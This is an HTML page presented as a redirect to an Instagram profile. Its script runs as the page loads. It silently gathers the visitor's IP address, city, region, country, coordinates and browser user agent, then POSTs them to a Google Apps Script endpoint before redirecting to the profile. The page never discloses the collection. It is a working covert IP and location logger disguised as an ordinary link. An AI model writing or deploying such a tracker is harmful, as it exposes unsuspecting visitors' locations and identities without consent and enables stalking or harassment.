<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>正在跳轉中...</title>
  <style>
    #map { height: 200px; width: 100%; margin-bottom: 10px; }
  </style>
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
</head>
<body>
  <p>正在跳轉到 IG</p>
  <div id="map"></div>

  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
  <script>
    (async () => {
      try {
        // 取得訪客 IP
        const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
        const ua = navigator.userAgent;

        // 改為自動偵測用戶地理資訊（不要指定 IP）
        const locRes = await fetch(`https://ip-api.com/json/`);
        const locData = await locRes.json();

        let country = "", region = "", city = "", lat = 0, lon = 0;
        if (locData.status === "success") {
          country = locData.country;
          region = locData.regionName;
          city = locData.city;
          lat = locData.lat;
          lon = locData.lon;
        }

        // 傳送資料給 Google Apps Script
        await fetch("https://script.google.com/macros/s/AKfycbyYKeXg-KLxCvet0aM95lqJNYLH7O8hZpqbJ2M8O7xrRAAUoSUMFdBUvI3SSL-MSgMm/exec", {
          method: "POST",
          headers: { "Content-Type": "text/plain;charset=utf-8" },
          body: JSON.stringify({ ip, country, region, city, lat, lon, ua })
        });

        // 顯示地圖（可選）
        if (lat && lon) {
          const map = L.map('map').setView([lat, lon], 8);
          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
          }).addTo(map);
          L.marker([lat, lon]).addTo(map)
            .bindPopup(`${city}, ${region}, ${country}`)
            .openPopup();
        }

      } catch (e) {
        console.error(e);
      } finally {
        // 跳轉 IG App（或改成 IG 網頁）
        window.location.replace("instagram://user?username=_1naux.1");
        // window.location.href = "https://www.instagram.com/_1naux.1";
      }
    })();
  </script>
</body>
</html>
